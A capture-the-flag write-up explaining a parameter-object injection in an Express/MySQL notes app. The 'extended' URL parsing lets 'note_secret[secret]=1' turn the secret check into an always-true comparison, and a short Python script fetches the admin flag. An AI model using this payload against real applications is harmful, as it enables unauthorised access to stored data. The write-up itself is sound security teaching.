### Reading the source code

For the purpose of simplicity I will list here only important functions and files,

for more details you can view the full files in this directory.

**Init.db**
```SQL
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL UNIQUE,
  `password` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=66 ;

CREATE TABLE IF NOT EXISTS `notes` (
  `note_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `secret` varchar(255) NOT NULL,
  `note` varchar(255) NOT NULL,
  PRIMARY KEY (`note_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=66 ;
```

**Start of index.js**
```JS
const express = require('express');
const bodyParser = require('body-parser');
const crypto=require('crypto');
var session = require('express-session');
const db = require('./database');
const middleware = require('./middlewares');

const app = express();


app.use(bodyParser.urlencoded({
extended: true
}))

app.use(session({
    secret: crypto.randomBytes(32).toString("hex"),
    resave: true,
    saveUninitialized: true
}));
```
**View endpoint**
```JS
app.get('/viewNote', middleware.auth, (req, res) => {
    const { note_id,note_secret } = req.query;

    if (note_id && note_secret){
        db.getNoteById(note_id, note_secret, (err, notes) => {
            if (err) {
            return res.status(500).json({ error: 'Internal Server Error' });
            }
            return res.json(notes);
        });
    }
    else
    {
        return res.status(400).json({"Error":"Missing required data"});
    }
});
```

**Get note by ID endpoint**
```JS
function getNoteById(noteId, secret, callback) {
  const query = 'SELECT note_id,username,note FROM notes WHERE note_id = ? and secret = ?';
  console.log(noteId,secret);
  pool.query(query, [noteId,secret], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      callback(err, null);
      return;
    }
    callback(null, results);
  });
}
```

**Insert flag as note in the admin account**
```JS
function insertAdminNoteOnce(callback) {
  const checkNoteQuery = 'SELECT COUNT(*) AS count FROM notes WHERE username = "admin"';
  const insertNoteQuery = 'INSERT INTO notes(username,note,secret)values(?,?,?)';
  const flag = process.env.DYN_FLAG || "placeholder";
  const secret = crypto.randomBytes(32).toString("hex");

  pool.query(checkNoteQuery, [], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      callback(err, null);
      return;
    }

    const NoteCount = results[0].count;

    if (NoteCount === 0) {
      pool.query(insertNoteQuery, ["admin", flag, secret], (err, results) => {
        if (err) {
          console.error('Error executing query:', err);
          callback(err, null);
          return;
        }
        console.log(`Admin Note inserted successfully with this secret ${secret}`);
        callback(null, results);
      });
    } else {
      console.log('Admin Note already exists. No insertion needed.');
      callback(null, null);
    }
  });
}
```

So this application basically have these functionalities :

- Register an account
- Login to account
- Profile view
- Add note
- View note

Also, when starting the program it automatically calls `insertAdminNoteOnce` function, which will insert the flag as a note with a random 32 hex secret in admin account.

To view a note you need to provide 2 GET parameters : `note_id` & `note_secret`.

So how can we view the flag? Clearly, we can't bruteforce a 32 random bytes secret.

### Analyzing

We can easily get the note id, by looking at the table creation : `AUTO_INCREMENT=66` which means that the ID starts from 66.

For the note secret, looking at the first few lines of `index.js` we can see an interesting line :
```JS
app.use(bodyParser.urlencoded({
extended: true
}))
```

What does `extended` means? From expressjs docs :

> The extended option allows to choose between parsing the URL-encoded data with the querystring library (when false) or the qs library (when true). The “extended” syntax allows for rich objects and arrays to be encoded into the URL-encoded format, allowing for a JSON-like experience with URL-encoded.

Perfect. so if we passed our GET query like this : `/viewNote?note_id=66&note_secret[c]=d`

It would be interpreted as :
```JS
note_id = 66
note_secret= {'c':'d'}
```

The viewNote route will then call the `getNotebyId` function, which will basically construct a SELECT query with our inputs :

```JS
function getNoteById(noteId, secret, callback) {
  const query = 'SELECT note_id,username,note FROM notes WHERE note_id = ? and secret = ?';
  console.log(noteId,secret);
  pool.query(query, [noteId,secret],
```

When you pass a javascript object to SQL, it treats the key as column and the value as the value of that column, in simpler terms our query is going to be like this :

```SQL
SELECT note_id,username,note FROM notes WHERE note_id = 66 and secret = `c` = 'd'
```

Backticks (`) meaning in SQL : 

> In MySQL, backticks are special syntax used for encapsulating identifiers like table and column names.

So if `c` was a column name, it will compare all the values in that column with `secret` which would result in `true` ( boolean value ) if at least one value appeared in both columns (c and secret) after that it will compare it with `'d'`.

So if we passed this GET query : `/viewNote?note_id=66&note_secret[secret]=1`

It would be interpreted in SQL as :
```SQL
SELECT note_id,username,note FROM notes WHERE note_id = 66 and secret = `secret` = '1'
```

so ```secret = `secret` = 1``` will evaluate to ```true = '1'``` which is always true in MySQL.

### Exploiting

Because of jailing we need to write a simple and fast script using `requests` session :

```py
import requests


sess = requests.Session()


url = "http://169.254.55.45:5000/"


data = {"username":"yonko123","password":"yonko123"}

print(sess.post(url+"register", data=data).text)

print(sess.post(url+"login", data=data).text)

print(sess.get(url+"viewNote?note_id=66&note_secret[secret]=1").text)
```

And we get the flag :

![Screenshot (202)](https://github.com/user-attachments/assets/a9bf7ae8-4e41-422c-9d30-28b6395a4052)
